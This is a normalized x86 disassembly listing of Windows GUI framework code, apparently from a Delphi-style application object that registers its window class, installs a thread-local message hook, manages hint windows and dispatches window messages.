mov eax [ eax - 0x8 ]
call sub_414210
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_414438
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4143bc
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_4613c0
test al al
je r-xdata
inc esi
sub_46171c
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_460c98
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_460c84
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_461774
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_46171c
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4617ee
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_4615d0
pop ecx
push ebp
mov al 0x2
call sub_4615d0
pop ecx
push ebp
mov al 0x3
call sub_4615d0
pop ecx
push ebp
mov al 0x4
call sub_4615d0
pop ecx
push ebp
mov al 0x5
call sub_4615d0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403344
retn
sub_4617fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_461390
xor eax eax
push ebp
push sub_461875
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_461398
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_461890
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_404094
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_4040e8
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_4618e8
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4037e4#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_463d34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46193c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_440dc8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_463db0
sub_461998
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_462e50
sub_4619dc
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_461998
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_46193c
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_461a50
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_461aac
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_461adc
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_461b04
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_461aac
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_461adc
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_461adc
sub_461b44
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419db0
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46321c
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e38
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_424208
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4639b4
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40cafc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_463414
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40cb24
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4089c8
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404304
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_463b90
mov eax ebx
call sub_4645a4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_461e4c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_461d2d
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_4645b4
mov [ esp + 0x4 ] esi
mov [ esp ] sub_46321c
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_463414
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_463db0
xor edx edx
mov eax esi
call sub_46372c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419dfc
push esi
push sub_462280
mov eax esi
call sub_463008
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4057e0
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403344
mov eax [ esi + 0x90 ]
call sub_403344
mov eax [ esi + 0x98 ]
call sub_403344
test bl bl
jle r-xdata
call sub_41aed8
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_461e4c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_461fed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ff4
lea eax [ ebp - 0x2c ]
call sub_404094
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_4623cc
call sub_41ae40
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404554
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_406d24
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_404094
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_462ad0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_462ad0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_461ffc
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_460ca0
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_46205c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_414210
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_448d84
cmp ebx eax
je r-xdata
sub_4620cc
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_46205c
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4143bc
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4621e4
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4143bc
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_462280
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40cdc4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_46123c
mov eax [ rw-data ]
call sub_461884
sub_4622d8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462335
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46233c
lea eax [ ebp - 0x4 ]
call sub_404094
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_40428c
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_462344
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_462380
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_462ad0
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_4623cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_462a86
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462280
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4634ec
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4143bc
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_448d84
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_464468
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_463008
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_462fac
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax esi
call sub_448d84
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x112 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_462ad0
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x13
je r-xdata
mov eax [ rw-data ]
call sub_461884
push ebp
call sub_462344
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x9c ] 0x1
jmp r-xdata
push ebp
call sub_462344
pop ecx
jmp [ eax * 4 + jump_table_462470 ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
jmp r-xdata
mov eax esi
call sub_448d84
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_462e84
test al al
je r-xdata
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax ] 0xde534454
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44d740
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4622d8
push ebp
call sub_462344
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_462344
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
push ebp
call sub_462344
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_419c10
jmp r-xdata
xor eax eax
call sub_45a07c
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov ebx eax
mov eax esi
call sub_448d84
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax esi
call sub_443750
push ebx
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462aec
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call SendMessageA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9e ] 0x0
je r-xdata
push ebp
call sub_462344
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x9d ] al
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
call sub_45f9f4
jmp r-xdata
push ebp
call sub_462344
pop ecx
jmp r-xdata
push ebp
call sub_462380
pop ecx
jmp r-xdata
push ebp
call sub_462344
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xac ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4621e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_462b9c
jmp r-xdata
jmp r-xdata
call sub_436540
call sub_436620
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4621d4
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4621e4
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4621dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_459f2c
mov edx [ ebp - 0x4 ]
mov [ edx + 0xac ] eax
push ebp
call sub_462344
pop ecx
jmp r-xdata
call sub_459fe0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xac ] edx
push ebp
call sub_462344
pop ecx
jmp r-xdata
call sub_436540
call sub_43667c
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx 0x8000
mov eax r-xdata
call sub_40d76c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
call GetLastError
mov edx [ ebp - 0x8 ]
